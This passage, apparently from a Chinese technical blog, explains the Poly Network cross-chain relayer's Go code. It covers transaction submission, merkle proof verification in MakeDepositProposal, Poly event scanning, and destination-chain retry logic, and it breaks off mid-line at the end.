class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Submitter)</span></span> consume(mq bus.SortedTxBus) <span class="type">error</span> &#123;</span><br><span class="line">	s.wg.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">defer</span> s.wg.Done()</span><br><span class="line">	ticker := time.NewTicker(<span class="number">300</span> * time.Millisecond)</span><br><span class="line">	<span class="keyword">defer</span> ticker.Stop()</span><br><span class="line"></span><br><span class="line">	height := s.ReadyBlock()</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> &lt;-s.Done():</span><br><span class="line">			log.Info(<span class="string">&quot;Submitter is exiting now&quot;</span>, <span class="string">&quot;chain&quot;</span>, s.name)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> &lt;-ticker.C:</span><br><span class="line">			h := s.ReadyBlock()</span><br><span class="line">			<span class="keyword">if</span> h &gt; <span class="number">0</span> &amp;&amp; height != h &#123;</span><br><span class="line">				height = h</span><br><span class="line">				log.Info(<span class="string">&quot;Current ready block height&quot;</span>, <span class="string">&quot;chain&quot;</span>, s.name, <span class="string">&quot;height&quot;</span>, height)</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		tx, block, err := mq.Pop(s.Context)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Error(<span class="string">&quot;Bus pop error&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> tx == <span class="literal">nil</span> &#123;</span><br><span class="line">			time.Sleep(<span class="number">200</span> * time.Millisecond)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> block &lt;= height &#123;</span><br><span class="line">			log.Info(<span class="string">&quot;Processing src tx&quot;</span>, <span class="string">&quot;src_hash&quot;</span>, tx.SrcHash, <span class="string">&quot;src_chain&quot;</span>, tx.SrcChainId, <span class="string">&quot;dst_chain&quot;</span>, tx.DstChainId)</span><br><span class="line">			err = s.submit(tx)</span><br><span class="line">			<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Info(<span class="string">&quot;Submitted src tx to poly&quot;</span>, <span class="string">&quot;src_hash&quot;</span>, tx.SrcHash, <span class="string">&quot;poly_hash&quot;</span>, tx.PolyHash)</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> errors.Is(err, msg.ERR_Tx_VERIFYMERKLEPROOF) &#123;</span><br><span class="line">				log.Warn(<span class="string">&quot;src tx submit to poly verifyMerkleProof failed, clear src proof&quot;</span>, <span class="string">&quot;chain&quot;</span>, s.name, <span class="string">&quot;src hash&quot;</span>, tx.SrcHash, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">				tx.SrcProofHex = <span class="string">&quot;&quot;</span></span><br><span class="line">				tx.SrcProof = []<span class="type">byte</span>&#123;&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> strings.Contains(err.Error(), <span class="string">&quot;side chain&quot;</span>) &amp;&amp; strings.Contains(err.Error(), <span class="string">&quot;not registered&quot;</span>) &#123;</span><br><span class="line">				log.Warn(<span class="string">&quot;Submit src tx to poly error&quot;</span>, <span class="string">&quot;chain&quot;</span>, s.name, <span class="string">&quot;err&quot;</span>, err, <span class="string">&quot;proof_height&quot;</span>, tx.SrcProofHeight)</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			block = height + <span class="number">10</span></span><br><span class="line">			tx.Attempts++</span><br><span class="line">			log.Error(<span class="string">&quot;Submit src tx to poly error&quot;</span>, <span class="string">&quot;chain&quot;</span>, s.name, <span class="string">&quot;err&quot;</span>, err, <span class="string">&quot;proof_height&quot;</span>, tx.SrcProofHeight, <span class="string">&quot;next_try&quot;</span>, block)</span><br><span class="line">			bus.SafeCall(s.Context, tx, <span class="string">&quot;push back to tx bus&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> mq.Push(context.Background(), tx, block) &#125;)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			bus.SafeCall(s.Context, tx, <span class="string">&quot;push back to tx bus&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> mq.Push(context.Background(), tx, block) &#125;)</span><br><span class="line">			time.Sleep(<span class="number">200</span> * time.Millisecond)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>submit()函数的实现</p>
<p>首先对一些交易参数进行检查，判断是否有效，是否为空，以及交易调用的方法是否为AllowMethod。</p>
<p>随后调用poly-go-sdk中的CrossChain API将对应的交易信息和交易证明传递给Poly。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Submitter)</span></span> submit(tx *msg.Tx) <span class="type">error</span> &#123;</span><br><span class="line">	err := s.composer.Compose(tx)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> strings.Contains(err.Error(), <span class="string">&quot;missing trie node&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> msg.ERR_PROOF_UNAVAILABLE</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> tx.Param == <span class="literal">nil</span> || tx.SrcChainId == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s submitter src tx %s param is missing or src chain id not specified&quot;</span>, s.name, tx.SrcHash)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> !config.CONFIG.AllowMethod(tx.Param.Method) &#123;</span><br><span class="line">		log.Error(<span class="string">&quot;Invalid src tx method&quot;</span>, <span class="string">&quot;src_hash&quot;</span>, tx.SrcHash, <span class="string">&quot;chain&quot;</span>, s.name, <span class="string">&quot;method&quot;</span>, tx.Param.Method)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> tx.SrcStateRoot == <span class="literal">nil</span> &#123;</span><br><span class="line">		tx.SrcStateRoot = []<span class="type">byte</span>&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> account []<span class="type">byte</span></span><br><span class="line">	<span class="keyword">switch</span> tx.SrcChainId &#123;</span><br><span class="line">	<span class="keyword">case</span> base.NEO, base.ONT:</span><br><span class="line">		account = s.signer.Address[:]</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(tx.SrcStateRoot) == <span class="number">0</span> || <span class="built_in">len</span>(tx.SrcProof) == <span class="number">0</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s submitter src tx src state root(%x) or src proof(%x) missing for chain %d with tx %s&quot;</span>, s.name, tx.SrcStateRoot, tx.SrcProof, tx.SrcChainId, tx.SrcHash)</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="comment">// For other chains, reversed?</span></span><br><span class="line">		account = common.Hex2Bytes(s.signer.Address.ToHexString())</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Check done tx existence</span></span><br><span class="line">		data, _ := s.sdk.Node().GetDoneTx(tx.SrcChainId, tx.Param.CrossChainID)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(data) != <span class="number">0</span> &#123;</span><br><span class="line">			log.Info(<span class="string">&quot;Tx already imported&quot;</span>, <span class="string">&quot;src_hash&quot;</span>, tx.SrcHash)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	t, err := s.sdk.Node().Native.Ccm.ImportOuterTransfer(</span><br><span class="line">		tx.SrcChainId,</span><br><span class="line">		tx.SrcEvent,</span><br><span class="line">		<span class="type">uint32</span>(tx.SrcProofHeight),</span><br><span class="line">		tx.SrcProof,</span><br><span class="line">		account,</span><br><span class="line">		tx.SrcStateRoot,</span><br><span class="line">		s.signer,</span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> strings.Contains(err.Error(), <span class="string">&quot;tx already done&quot;</span>) &#123;</span><br><span class="line">			log.Info(<span class="string">&quot;Tx already imported&quot;</span>, <span class="string">&quot;src_hash&quot;</span>, tx.SrcHash, <span class="string">&quot;chain&quot;</span>, tx.SrcChainId)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> strings.Contains(err.Error(), <span class="string">&quot;verifyMerkleProof error&quot;</span>) &#123;</span><br><span class="line">			log.Error(<span class="string">&quot;Tx verifyMerkleProof err&quot;</span>, <span class="string">&quot;src_hash&quot;</span>, tx.SrcHash, <span class="string">&quot;chain&quot;</span>, tx.SrcChainId, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span> msg.ERR_Tx_VERIFYMERKLEPROOF</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;Failed to import tx to poly, %v tx src hash %s&quot;</span>, err, tx.SrcHash)</span><br><span class="line">	&#125;</span><br><span class="line">	tx.PolyHash = t.ToHexString()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Poly-Chain"><a href="#Poly-Chain" class="headerlink" title="Poly Chain"></a>Poly Chain</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ChainHandler <span class="keyword">interface</span> &#123;</span><br><span class="line">    MakeDepositProposal(service *native.NativeService) (*MakeTxParam, <span class="type">error</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数用来验证跨链交易的合法性，并将合法交易存储到Poly Chain中。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *ETHHandler)</span></span> MakeDepositProposal(service *native.NativeService) (*scom.MakeTxParam, <span class="type">error</span>) &#123;</span><br><span class="line">	params := <span class="built_in">new</span>(scom.EntranceParam)</span><br><span class="line">	<span class="comment">//parse the EntranceParam from native service data</span></span><br><span class="line">	<span class="keyword">if</span> err := params.Deserialization(common.NewZeroCopySource(service.GetInput())); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;eth MakeDepositProposal, contract params deserialize error: %s&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//get registered side chain information from poly chain</span></span><br><span class="line">	sideChain, err := side_chain_manager.GetSideChain(service, params.SourceChainID)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;eth MakeDepositProposal, side_chain_manager.GetSideChain error: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Verify the merkle proof and return the parsed txParam from Extra field after</span></span><br><span class="line">	value, err := verifyFromEthTx(service, params.Proof, params.Extra, params.SourceChainID, params.Height, sideChain)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;eth MakeDepositProposal, verifyFromEthTx error: %s&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Look for this tx on relay chain to make sure this tx hasn&#x27;t been executed yet</span></span><br><span class="line">	<span class="keyword">if</span> err := scom.CheckDoneTx(service, value.CrossChainID, params.SourceChainID); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;eth MakeDepositProposal, check done transaction error:%s&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := scom.PutDoneTx(service, value.CrossChainID, params.SourceChainID); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;eth MakeDepositProposal, PutDoneTx error:%s&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> value, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据ChainID得到对应的侧链信息，进行merkle proof的验证，返回对应解析过的txParam</p>
<p>txParam用于验证这个交易是否已经执行了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MakeTxParam <span class="keyword">struct</span> &#123;</span><br><span class="line">    TxHash              []<span class="type">byte</span></span><br><span class="line">    CrossChainID        []<span class="type">byte</span></span><br><span class="line">    FromContractAddress []<span class="type">byte</span></span><br><span class="line">    ToChainID           <span class="type">uint64</span></span><br><span class="line">    ToContractAddress   []<span class="type">byte</span></span><br><span class="line">    Method              <span class="type">string</span></span><br><span class="line">    Args                []<span class="type">byte</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>MakeDepositProposal </strong>  中主要有两个函数 <strong>verifyFromTx</strong>  和  <strong>verifyMerkleProof</strong>   </p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Method</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>verifyFromTx</td>
<td>该方法用于从Poly Chain存储的数据库中获取同步的区块头，然后调用函数verifyMerkleProof验证跨链交易的合法性</td>
</tr>
<tr>
<td>verifyMerkleProof</td>
<td>该方法用于验证交易提交的Merkle证明是否与存储在Poly中的区块头一致</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  @param native       Native Service that carries values of information of cross-chain events     </span></span><br><span class="line"><span class="comment"> *  @param proof        The proof submitted by the current cross-chain transaction      </span></span><br><span class="line"><span class="comment"> *  @param extra        The cross-chain message which is used to construct MakeTxParam </span></span><br><span class="line"><span class="comment"> *  @param fromChainID  Source chain id</span></span><br><span class="line"><span class="comment"> *  @param height       The block height corresponding to the current transaction event</span></span><br><span class="line"><span class="comment"> *  @param sideChain    Source chain information that contains the ccm contract address</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">verifyFromEthTx</span><span class="params">(native *native.NativeService, proof, extra []<span class="type">byte</span>, fromChainID <span class="type">uint64</span>, height <span class="type">uint32</span>, sideChain *cmanager.SideChain)</span></span> (*scom.MakeTxParam, <span class="type">error</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  @param ethProof      The proof submitted by the current cross-chain transaction </span></span><br><span class="line"><span class="comment"> *  @param blockData     The block header stored in poly chain corresponding to the current transaction event      </span></span><br><span class="line"><span class="comment"> *  @param contractAddr  The ccm contract address</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">VerifyMerkleProof</span><span class="params">(ethProof *ETHProof, blockData *eth.Header, contractAddr []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br></pre></td></tr></table></figure>
<p>验证通过之后，检验对应的交易信息是否已经存储在relayer chain中，若无，则将其存入relayer chain的数据库中。</p>
<h3 id="Relayer-1"><a href="#Relayer-1" class="headerlink" title="Relayer"></a>Relayer</h3><h4 id="Polylisten"><a href="#Polylisten" class="headerlink" title="Polylisten"></a>Polylisten</h4><p>relayer通过调用ScanDst()函数，通过对应的rpc接口，获取对应的跨链事件，进一步构造对应的跨链交易信息，并通过调用对应的GetProof()函数获取对应的merkle proof。</p>
<p>poly-relayer/relayer/poly/listener.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *Listener)</span></span> ScanDst(height <span class="type">uint64</span>) (txs []*msg.Tx, err <span class="type">error</span>) &#123;</span><br><span class="line">	txs, err = l.Scan(height)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123; <span class="keyword">return</span> &#125;</span><br><span class="line">	sub := &amp;Submitter&#123;sdk:l.sdk&#125;</span><br><span class="line">	<span class="keyword">for</span> _, tx := <span class="keyword">range</span> txs &#123;</span><br><span class="line">		tx.MerkleValue, _, _, err = sub.GetProof(tx.PolyHeight, tx.PolyKey)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123; <span class="keyword">return</span> &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *Listener)</span></span> Scan(height <span class="type">uint64</span>) (txs []*msg.Tx, err <span class="type">error</span>) &#123;</span><br><span class="line">	events, err := l.sdk.Node().GetSmartContractEventByBlock(<span class="type">uint32</span>(height))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, event := <span class="keyword">range</span> events &#123;</span><br><span class="line">		<span class="keyword">for</span> _, notify := <span class="keyword">range</span> event.Notify &#123;</span><br><span class="line">			<span class="keyword">if</span> notify.ContractAddress == poly.CCM_ADDRESS &#123;</span><br><span class="line">				states := notify.States.([]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">				<span class="keyword">if</span> <span class="built_in">len</span>(states) &lt; <span class="number">6</span> &#123;</span><br><span class="line">					<span class="keyword">continue</span></span><br><span class="line">				&#125;</span><br><span class="line">				method, _ := states[<span class="number">0</span>].(<span class="type">string</span>)</span><br><span class="line">				<span class="keyword">if</span> method != <span class="string">&quot;makeProof&quot;</span> &#123;</span><br><span class="line">					<span class="keyword">continue</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				dstChain := <span class="type">uint64</span>(states[<span class="number">2</span>].(<span class="type">float64</span>))</span><br><span class="line">				<span class="keyword">if</span> dstChain == <span class="number">0</span> &#123;</span><br><span class="line">					log.Error(<span class="string">&quot;Invalid dst chain id in poly tx&quot;</span>, <span class="string">&quot;hash&quot;</span>, event.TxHash)</span><br><span class="line">					<span class="keyword">continue</span></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				tx := <span class="built_in">new</span>(msg.Tx)</span><br><span class="line">				tx.DstChainId = dstChain</span><br><span class="line">				tx.PolyKey = states[<span class="number">5</span>].(<span class="type">string</span>)</span><br><span class="line">				tx.PolyHeight = <span class="type">uint32</span>(height)</span><br><span class="line">				tx.PolyHash = event.TxHash</span><br><span class="line">				tx.TxType = msg.POLY</span><br><span class="line">				tx.TxId = states[<span class="number">3</span>].(<span class="type">string</span>)</span><br><span class="line">				tx.SrcChainId = <span class="type">uint64</span>(states[<span class="number">1</span>].(<span class="type">float64</span>))</span><br><span class="line">				<span class="keyword">switch</span> tx.SrcChainId &#123;</span><br><span class="line">				<span class="keyword">case</span> base.NEO, base.NEO3, base.ONT:</span><br><span class="line">					tx.TxId = util.ReverseHex(tx.TxId)</span><br><span class="line">				&#125;</span><br><span class="line">				txs = <span class="built_in">append</span>(txs, tx)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过对应的poly-go-sdk中的API接口，获取对应的交易证明</p>
<p>poly-relayer/relayer/poly/compose.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Submitter)</span></span> GetProof(height <span class="type">uint32</span>, key <span class="type">string</span>) (param *ccom.ToMerkleValue, auditPath <span class="type">string</span>, evt *scom.SmartContactEvent, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> s.getProof(s.sdk.Node(), height, key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Submitter)</span></span> getProof(node *poly.Client, height <span class="type">uint32</span>, key <span class="type">string</span>) (param *ccom.ToMerkleValue, auditPath <span class="type">string</span>, evt *scom.SmartContactEvent, err <span class="type">error</span>) &#123;</span><br><span class="line">	proof, err := node.GetCrossStatesProof(height, key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		err = fmt.Errorf(<span class="string">&quot;GetProof: GetCrossStatesProof key %s, error %v&quot;</span>, key, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	auditPath = proof.AuditPath</span><br><span class="line">	path, err := hex.DecodeString(proof.AuditPath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	value, _, _, _ := msg.ParseAuditPath(path)</span><br><span class="line">	param = <span class="built_in">new</span>(ccom.ToMerkleValue)</span><br><span class="line">	err = param.Deserialization(pcom.NewZeroCopySource(value))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		err = fmt.Errorf(<span class="string">&quot;GetPolyParams: param.Deserialization error %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后的过程，与前一个relayer类似，将对应的跨链消息以队列的形式存入到Redis数据库中。</p>
<h4 id="PolyCommit"><a href="#PolyCommit" class="headerlink" title="PolyCommit"></a>PolyCommit</h4><p>realyer调用start()函数启动对应的submitter，循环从队列中Pop出对应的跨链消息。</p>
<p>poly-relayer/relayer/eth/eth.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Submitter)</span></span> run(account accounts.Account, mq bus.TxBus, delay bus.DelayedTxBus, compose msg.PolyComposer) <span class="type">error</span> &#123;</span><br><span class="line">	s.wg.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">defer</span> s.wg.Done()</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> &lt;-s.Done():</span><br><span class="line">			log.Info(<span class="string">&quot;Submitter is exiting now&quot;</span>, <span class="string">&quot;chain&quot;</span>, s.name)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		&#125;</span><br><span class="line">		tx, err := mq.Pop(s.Context)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Error(<span class="string">&quot;Bus pop error&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> tx == <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Warn(<span class="string">&quot;Bus pop nil?&quot;</span>, <span class="string">&quot;chain&quot;</span>, s.name)</span><br><span class="line">			time.Sleep(time.Second)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		log.Info(<span class="string">&quot;Processing poly tx&quot;</span>, <span class="string">&quot;poly_hash&quot;</span>, tx.PolyHash, <span class="string">&quot;account&quot;</span>, account.Address)</span><br><span class="line">		tx.DstSender = &amp;account</span><br><span class="line">		err = s.ProcessTx(tx, compose)</span><br><span class="line">		<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">			err = s.SubmitTx(tx)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Error(<span class="string">&quot;Process poly tx error&quot;</span>, <span class="string">&quot;chain&quot;</span>, s.name, <span class="string">&quot;poly_hash&quot;</span>, tx.PolyHash, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">			log.Json(log.ERROR, tx)</span><br><span class="line">			<span class="keyword">if</span> errors.Is(err, msg.ERR_INVALID_TX) || errors.Is(err, msg.ERR_TX_BYPASS) &#123;</span><br><span class="line">				log.Error(<span class="string">&quot;Skipped poly tx for error&quot;</span>, <span class="string">&quot;poly_hash&quot;</span>, tx.PolyHash, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			tx.Attempts++</span><br><span class="line">			<span class="comment">// <span class="doctag">TODO:</span> retry with increased gas price?</span></span><br><span class="line">			<span class="keyword">if</span> errors.Is(err, msg.ERR_TX_EXEC_FAILURE) || errors.Is(err, msg.ERR_TX_EXEC_ALWAYS_FAIL) &#123;</span><br><span class="line">				tsp := time.Now().Unix() + <span class="number">60</span>*<span class="number">3</span></span><br><span class="line">				bus.SafeCall(s.Context, tx, <span class="string">&quot;push to delay queue&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> delay.Delay(context.Background(), tx, tsp) &#125;)</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> errors.Is(err, msg.ERR_FEE_CHECK_FAILURE) &#123;</span><br><span class="line">				tsp := time.Now().Unix() + <span class="number">10</span></span><br><span class="line">				bus.SafeCall(s.Context, tx, <span class="string">&quot;push to delay queue&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> delay.Delay(context.Background(), tx, tsp) &#125;)</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> errors.Is(err, msg.ERR_PAID_FEE_TOO_LOW) &#123;</span><br><span class="line">				tsp := time.Now().Unix() + <span class="number">60</span>*<span class="number">10</span></span><br><span class="line">				bus.SafeCall(s.Context, tx, <span class="string">&quot;push to delay queue&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> delay.Delay(context.Background(), tx, tsp) &#125;)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				tsp := time.Now().Unix() + <span class="number">1</span></span><br><span class="line">				bus.SafeCall(s.Context, tx, <span class="string">&quot;push to delay queue&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> delay.Delay(context.Background(), tx, tsp) &#125;)</span><br><span class="line">				<span class="keyword">if</span> errors.Is(err, msg.ERR_LOW_BALANCE) &#123;</span><br><span class="line">					log.Info(<span class="string">&quot;Low wallet balance detected&quot;</span>, <span class="string">&quot;chain&quot;</span>, s.name, <span class="string">&quot;account&quot;</span>, account.Address)</span><br><span class="line">					s.WaitForBalance(account.Address)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			log.Info(<span class="string">&quot;Submitted poly tx&quot;</span>, <span class="string">&quot;poly_hash&quot;</span>, tx.PolyHash, <span class="string">&quot;chain&quot;</span>, s.name, <span class="string">&quot;dst_hash&quot;</span>, tx.DstHash)</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Retry to verify a successful submit</span></span><br><span class="line">			tsp := <span class="type">int64</span>(<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">switch</span> s.config.ChainId &#123;</span><br><span class="line">			<span class="keyword">case</span> base.MATIC, base.PLT:</span><br><span class="line">				tsp = time.Now().Unix() + <span class="number">60</span>*<span class="number">3</span></span><br><span class="line">			<span class="keyword">case</span> base.ARBITRUM, base.OPTIMISM:</span><br><span class="line">				tsp = time.Now().Unix() + <span class="number">60</span>*<span class="number">25</span></span><br><span class="line">			<span class="keyword">case</span> base.BSC, base.HECO, base.OK, base.KCC, base.BYTOM, base.HSC, base.MILKO:</span><br><span class="line">				tsp = time.Now().Unix() + <span class="number">60</span>*<span class="number">4</span></span><br><span class="line">			<span class="keyword">case</span> base.ETH:</span><br><span class="line">				tsp = time.Now().Unix() + <span class="number">60</span>*<span class="number">6</span></span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				tsp = time.Now().Unix() + <span class="number">60</span>*<span class="number">3</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> tsp 